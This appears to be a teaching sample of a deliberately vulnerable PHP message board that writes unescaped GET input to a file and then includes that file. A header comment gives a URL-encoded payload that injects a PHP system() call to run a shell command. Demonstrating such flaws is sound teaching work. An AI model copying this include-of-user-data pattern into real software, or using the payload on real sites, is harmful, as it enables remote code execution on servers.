// Exploit:
// - name=h4x0r
// - message=%3C?php%20system(%22/bin/ls%20-l%22);?%3E
//   which will decode to the following: <?php system("/bin/ls -l");?>

<?php
$MessageFile = "messages.out";
if ($_GET["action"] == "NewMessage") {
    $name = $_GET["name"];
    $message = $_GET["message"];
    $handle = fopen($MessageFile, "a+");
    fwrite($handle, "<b>$name</b> says '$message'<hr>\n");
    fclose($handle);
    echo "Message Saved!<p>\n";
}
else if ($_GET["action"] == "ViewMessages") {
    include($MessageFile);
}
